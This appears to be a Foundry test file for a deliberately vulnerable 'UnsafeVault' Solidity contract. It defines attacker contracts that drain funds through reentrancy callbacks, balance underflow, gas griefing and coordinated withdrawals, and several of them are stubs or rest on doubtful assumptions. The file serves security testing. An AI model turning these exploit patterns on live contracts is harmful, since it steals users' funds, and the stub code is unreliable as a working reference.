// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.19;

import {Test, console} from "forge-std/Test.sol";
import {UnsafeVault, ReentrancyAttacker} from "../Vault.sol";

/**
 * @title VaultEdgeCasesTest
 * @notice Comprehensive edge case and boundary testing for vault security
 * Focuses on extreme scenarios, precision attacks, and unusual contract states
 * that might reveal hidden vulnerabilities
 */
contract VaultEdgeCasesTest is Test {
    UnsafeVault public vault;
    
    address public constant USER1 = address(1);
    address public constant USER2 = address(2);
    address public constant ATTACKER = address(0x1337);
    
    function setUp() public {
        vault = new UnsafeVault();
        
        // Fund test addresses with extreme amounts for edge testing
        vm.deal(USER1, type(uint128).max);
        vm.deal(USER2, type(uint128).max);
        vm.deal(ATTACKER, type(uint128).max);
    }

    /*//////////////////////////////////////////////////////////////
                        PRECISION & ROUNDING ATTACKS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test: Wei-level precision exploitation
     * Tests if tiny amounts can be exploited for cumulative attacks
     */
    function test_Audit_WeiLevelPrecisionAttack() public {
        console.log("=== WEI-LEVEL PRECISION ATTACK TEST ===");
        
        PrecisionAttacker precisionAttacker = new PrecisionAttacker(address(vault));
        vm.deal(address(precisionAttacker), 10 ether);
        
        // Execute micro-attack with minimal amounts
        uint256 iterations = 10000;
        uint256 microAmount = 1 wei;
        
        vm.startPrank(address(precisionAttacker));
        
        for (uint256 i = 0; i < iterations; i++) {
            vault.deposit{value: microAmount}();
            
            // Attempt precision exploit
            try vault.withdraw(microAmount) {
                // Success - check for any precision gain
            } catch {
                // Expected to fail at some point
                break;
            }
        }
        
        vm.stopPrank();
        
        uint256 finalBalance = precisionAttacker.getBalance();
        console.log("Precision attacker final balance:", finalBalance);
        
        // Check if precision attack yielded any profit
        if (finalBalance > 10 ether) {
            console.log("PRECISION ATTACK SUCCESSFUL - Profit:", finalBalance - 10 ether);
        }
    }

    /**
     * @notice Test: Maximum value boundary exploits
     * Tests behavior at uint256 maximum values
     */
    function test_Audit_MaxValueBoundaryExploit() public {
        console.log("=== MAX VALUE BOUNDARY EXPLOIT TEST ===");
        
        MaxValueAttacker maxAttacker = new MaxValueAttacker(address(vault));
        
        // Try to trigger overflow/underflow at maximum values
        vm.startPrank(address(maxAttacker));
        
        // Attempt to deposit maximum possible value (should fail)
        vm.expectRevert();
        vault.deposit{value: type(uint256).max}();
        
        // Test with large but valid amounts
        uint256 largeAmount = type(uint128).max;
        vm.deal(address(maxAttacker), largeAmount);
        
        vault.deposit{value: largeAmount}();
        
        // Check if we can manipulate balance to approach uint256.max
        uint256 currentBalance = vault.balances(address(maxAttacker));
        console.log("Large deposit successful, balance:", currentBalance);
        
        // Attempt withdrawal to trigger underflow
        vault.withdraw(largeAmount);
        vault.withdraw(1 wei); // This should trigger underflow
        
        uint256 balanceAfterUnderflow = vault.balances(address(maxAttacker));
        console.log("Balance after underflow attempt:", balanceAfterUnderflow);
        
        assertTrue(balanceAfterUnderflow > largeAmount, "Underflow should create larger balance");
        
        vm.stopPrank();
    }

    /*//////////////////////////////////////////////////////////////
                        ZERO VALUE EDGE CASES
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test: Zero value operation exploits
     * Tests unusual behavior with zero-value operations
     */
    function test_Audit_ZeroValueExploits() public {
        console.log("=== ZERO VALUE EXPLOITS TEST ===");
        
        ZeroValueAttacker zeroAttacker = new ZeroValueAttacker(address(vault));
        vm.deal(address(zeroAttacker), 1 ether);
        
        vm.startPrank(address(zeroAttacker));
        
        // Test zero deposit (should fail)
        vm.expectRevert("Deposit must be greater than zero");
        vault.deposit{value: 0}();
        
        // Deposit normal amount then try zero withdrawal
        vault.deposit{value: 1 ether}();
        
        // Zero withdrawal should technically succeed but do nothing
        uint256 balanceBefore = vault.balances(address(zeroAttacker));
        vault.withdraw(0);
        uint256 balanceAfter = vault.balances(address(zeroAttacker));
        
        assertEq(balanceBefore, balanceAfter, "Zero withdrawal should not change balance");
        
        vm.stopPrank();
        
        console.log("Zero value exploit test completed");
    }

    /*//////////////////////////////////////////////////////////////
                        CONTRACT STATE CORRUPTION
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test: Systematic state corruption
     * Tests scenarios that could corrupt contract state permanently
     */
    function test_Audit_StateCorruptionAttack() public {
        console.log("=== STATE CORRUPTION ATTACK TEST ===");
        
        StateCorruptionAttacker corruptionAttacker = new StateCorruptionAttacker(address(vault));
        vm.deal(address(corruptionAttacker), 50 ether);
        
        // Setup normal state
        vm.prank(USER1);
        vault.deposit{value: 10 ether}();
        
        vm.prank(USER2);
        vault.deposit{value: 20 ether}();
        
        uint256 initialContractBalance = vault.getBalance();
        uint256 initialTotalBalance = vault.totalVaultBalance();
        
        console.log("Initial contract balance:", initialContractBalance);
        console.log("Initial total user balance:", initialTotalBalance);
        
        // Execute state corruption attack
        vm.startPrank(address(corruptionAttacker));
        corruptionAttacker.executeStateCorruption();
        vm.stopPrank();
        
        uint256 finalContractBalance = vault.getBalance();
        uint256 finalTotalBalance = vault.totalVaultBalance();
        
        console.log("Final contract balance:", finalContractBalance);
        console.log("Final total user balance:", finalTotalBalance);
        
        // Check for state inconsistencies
        int256 balanceDifference = int256(finalContractBalance) - int256(finalTotalBalance);
        console.log("Balance difference (contract - total):", balanceDifference);
        
        if (balanceDifference != 0) {
            console.log("STATE CORRUPTION DETECTED!");
            console.log("Contract accounting is inconsistent");
        }
    }

    /**
     * @notice Test: Multiple attacker coordination
     * Tests coordinated attacks from multiple malicious contracts
     */
    function test_Audit_MultipleAttackerCoordination() public {
        console.log("=== MULTIPLE ATTACKER COORDINATION TEST ===");
        
        // Deploy multiple attackers
        address[] memory attackers = new address[](5);
        for (uint256 i = 0; i < 5; i++) {
            CoordinatedAttacker attacker = new CoordinatedAttacker(address(vault), i);
            attackers[i] = address(attacker);
            vm.deal(address(attacker), 10 ether);
        }
        
        // Setup victim funds
        vm.prank(USER1);
        vault.deposit{value: 50 ether}();
        
        uint256 vaultBalanceBefore = vault.getBalance();
        console.log("Vault balance before coordinated attack:", vaultBalanceBefore);
        
        // Execute coordinated attack sequence
        for (uint256 i = 0; i < attackers.length; i++) {
            CoordinatedAttacker attacker = CoordinatedAttacker(payable(attackers[i]));
            
            vm.startPrank(attackers[i]);
            attacker.setupPhase();
            vm.stopPrank();
        }
        
        // Trigger simultaneous attack
        for (uint256 i = 0; i < attackers.length; i++) {
            CoordinatedAttacker attacker = CoordinatedAttacker(payable(attackers[i]));
            
            vm.startPrank(attackers[i]);
            attacker.executeAttack();
            vm.stopPrank();
        }
        
        uint256 vaultBalanceAfter = vault.getBalance();
        console.log("Vault balance after coordinated attack:", vaultBalanceAfter);
        
        uint256 totalDamage = vaultBalanceBefore - vaultBalanceAfter;
        console.log("Total damage from coordinated attack:", totalDamage);
        
        // Coordinated attacks should be more effective than individual ones
        assertTrue(totalDamage > 40 ether, "Coordinated attack should cause significant damage");
    }

    /*//////////////////////////////////////////////////////////////
                        TEMPORAL ATTACK PATTERNS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test: Time-delayed attack sequences
     * Tests attacks that span multiple blocks/transactions
     */
    function test_Audit_TimeDelayedAttackSequence() public {
        console.log("=== TIME-DELAYED ATTACK SEQUENCE TEST ===");
        
        TimeDelayedAttacker delayedAttacker = new TimeDelayedAttacker(address(vault));
        vm.deal(address(delayedAttacker), 5 ether);
        
        // Phase 1: Setup (Block N)
        vm.startPrank(address(delayedAttacker));
        delayedAttacker.setupDelayedAttack();
        vm.stopPrank();
        
        uint256 setupBlock = block.number;
        console.log("Attack setup at block:", setupBlock);
        
        // Advance time and blocks
        vm.roll(block.number + 10);
        vm.warp(block.timestamp + 1 hours);
        
        // Phase 2: Execution (Block N+10)
        vm.startPrank(address(delayedAttacker));
        delayedAttacker.executeDelayedAttack();
        vm.stopPrank();
        
        uint256 executeBlock = block.number;
        console.log("Attack executed at block:", executeBlock);
        console.log("Block delay:", executeBlock - setupBlock);
        
        // Check if time delay affects attack success
        uint256 attackerBalance = delayedAttacker.getBalance();
        console.log("Attacker balance after delayed attack:", attackerBalance);
    }

    /*//////////////////////////////////////////////////////////////
                        EXTERNAL DEPENDENCY EXPLOITS
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test: Malicious recipient contracts with complex logic
     * Tests advanced recipient contract attacks
     */
    function test_Audit_AdvancedRecipientExploits() public {
        console.log("=== ADVANCED RECIPIENT EXPLOITS TEST ===");
        
        // Deploy various malicious recipient types
        address[] memory maliciousRecipients = new address[](3);
        
        // Type 1: State manipulator
        maliciousRecipients[0] = address(new StateMaliciousRecipient(address(vault)));
        
        // Type 2: Gas consumer
        maliciousRecipients[1] = address(new GasMaliciousRecipient(address(vault)));
        
        // Type 3: Recursive caller
        maliciousRecipients[2] = address(new RecursiveMaliciousRecipient(address(vault)));
        
        for (uint256 i = 0; i < maliciousRecipients.length; i++) {
            console.log("Testing malicious recipient type:", i);
            
            address recipient = maliciousRecipients[i];
            vm.deal(recipient, 2 ether);
            
            // Setup recipient as vault user
            vm.startPrank(recipient);
            vault.deposit{value: 1 ether}();
            
            // Attempt withdrawal to trigger malicious behavior
            try vault.withdraw(1 ether) {
                console.log("Malicious recipient attack succeeded");
            } catch {
                console.log("Malicious recipient attack failed (expected)");
            }
            
            vm.stopPrank();
        }
    }

    /*//////////////////////////////////////////////////////////////
                        INVARIANT STRESS TESTING
    //////////////////////////////////////////////////////////////*/

    /**
     * @notice Test: Extreme stress on contract invariants
     * Tests invariants under maximum possible stress
     */
    function test_Audit_InvariantStressTesting() public {
        console.log("=== INVARIANT STRESS TESTING ===");
        
        InvariantStressAttacker stressAttacker = new InvariantStressAttacker(address(vault));
        vm.deal(address(stressAttacker), 100 ether);
        
        // Stress test with maximum operations
        vm.startPrank(address(stressAttacker));
        
        for (uint256 i = 0; i < 100; i++) {
            stressAttacker.stressTestOperation(i);
            
            // Check invariants every 10 operations
            if (i % 10 == 0) {
                uint256 contractBalance = vault.getBalance();
                uint256 totalBalance = vault.totalVaultBalance();
                
                if (contractBalance != totalBalance) {
                    console.log("INVARIANT VIOLATION at operation:", i);
                    console.log("Contract balance:", contractBalance);
                    console.log("Total balance:", totalBalance);
                    break;
                }
            }
        }
        
        vm.stopPrank();
        
        console.log("Stress testing completed");
    }
}

/*//////////////////////////////////////////////////////////////
                        SPECIALIZED ATTACK CONTRACTS
//////////////////////////////////////////////////////////////*/

/**
 * @title PrecisionAttacker
 * @notice Tests precision-based exploits with minimal amounts
 */
contract PrecisionAttacker {
    UnsafeVault public vault;
    uint256 public totalProfit;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
    
    receive() external payable {
        totalProfit += msg.value;
    }
}

/**
 * @title MaxValueAttacker
 * @notice Tests attacks using maximum possible values
 */
contract MaxValueAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
}

/**
 * @title ZeroValueAttacker
 * @notice Tests exploits using zero values
 */
contract ZeroValueAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
}

/**
 * @title StateCorruptionAttacker
 * @notice Tests systematic state corruption attacks
 */
contract StateCorruptionAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function executeStateCorruption() external payable {
        // Phase 1: Normal deposit
        vault.deposit{value: 5 ether}();
        
        // Phase 2: Underflow exploit
        vault.withdraw(5 ether);
        vault.withdraw(1 ether); // Trigger underflow
        
        // Phase 3: Reentrancy with corrupted state
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        if (address(vault).balance > 1 ether) {
            vault.withdraw(1 ether);
        }
    }
}

/**
 * @title CoordinatedAttacker
 * @notice One of multiple attackers in coordinated attack
 */
contract CoordinatedAttacker {
    UnsafeVault public vault;
    uint256 public attackerId;
    bool public setupComplete;
    
    constructor(address _vault, uint256 _id) {
        vault = UnsafeVault(_vault);
        attackerId = _id;
    }
    
    function setupPhase() external payable {
        vault.deposit{value: 1 ether}();
        setupComplete = true;
    }
    
    function executeAttack() external {
        require(setupComplete, "Setup not complete");
        vault.withdraw(1 ether);
    }
    
    receive() external payable {
        // Each attacker has different reentrancy behavior
        if (attackerId % 2 == 0 && address(vault).balance > 0.5 ether) {
            vault.withdraw(0.5 ether);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title TimeDelayedAttacker
 * @notice Tests time-based attack sequences
 */
contract TimeDelayedAttacker {
    UnsafeVault public vault;
    uint256 public setupTimestamp;
    uint256 public setupBlock;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function setupDelayedAttack() external payable {
        vault.deposit{value: 2 ether}();
        setupTimestamp = block.timestamp;
        setupBlock = block.number;
    }
    
    function executeDelayedAttack() external {
        require(block.timestamp > setupTimestamp + 30 minutes, "Too early");
        require(block.number > setupBlock + 5, "Not enough blocks");
        
        vault.withdraw(2 ether);
    }
    
    receive() external payable {
        if (address(vault).balance > 1 ether) {
            vault.withdraw(1 ether);
        }
    }
    
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}

/**
 * @title StateMaliciousRecipient
 * @notice Malicious recipient that manipulates global state
 */
contract StateMaliciousRecipient {
    UnsafeVault public vault;
    mapping(uint256 => uint256) public stateManipulation;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    receive() external payable {
        // Manipulate state during receive
        for (uint256 i = 0; i < 50; i++) {
            stateManipulation[i] = block.timestamp + i;
        }
    }
}

/**
 * @title GasMaliciousRecipient
 * @notice Malicious recipient that wastes gas
 */
contract GasMaliciousRecipient {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    receive() external payable {
        // Waste gas through expensive operations
        uint256 dummy;
        for (uint256 i = 0; i < 5000; i++) {
            dummy += i * block.timestamp * block.difficulty;
        }
    }
}

/**
 * @title RecursiveMaliciousRecipient
 * @notice Malicious recipient that makes recursive calls
 */
contract RecursiveMaliciousRecipient {
    UnsafeVault public vault;
    uint256 public recursionDepth;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    receive() external payable {
        recursionDepth++;
        if (recursionDepth < 3 && address(vault).balance > 0.1 ether) {
            vault.withdraw(0.1 ether);
        }
        recursionDepth--;
    }
}

/**
 * @title InvariantStressAttacker
 * @notice Generates maximum stress on contract invariants
 */
contract InvariantStressAttacker {
    UnsafeVault public vault;
    
    constructor(address _vault) {
        vault = UnsafeVault(_vault);
    }
    
    function stressTestOperation(uint256 operationId) external payable {
        uint256 operation = operationId % 4;
        
        if (operation == 0) {
            // Deposit
            if (address(this).balance > 0.1 ether) {
                vault.deposit{value: 0.1 ether}();
            }
        } else if (operation == 1) {
            // Normal withdraw
            uint256 balance = vault.balances(address(this));
            if (balance > 0.1 ether) {
                vault.withdraw(0.1 ether);
            }
        } else if (operation == 2) {
            // Underflow attempt
            uint256 balance = vault.balances(address(this));
            if (balance > 0) {
                vault.withdraw(balance);
                vault.withdraw(0.1 ether); // Trigger underflow
            }
        } else {
            // Reentrancy attempt
            if (vault.balances(address(this)) > 0.1 ether) {
                vault.withdraw(0.1 ether);
            }
        }
    }
    
    receive() external payable {
        // Minimal reentrancy for stress testing
        if (address(vault).balance > 0.05 ether) {
            vault.withdraw(0.05 ether);
        }
    }
}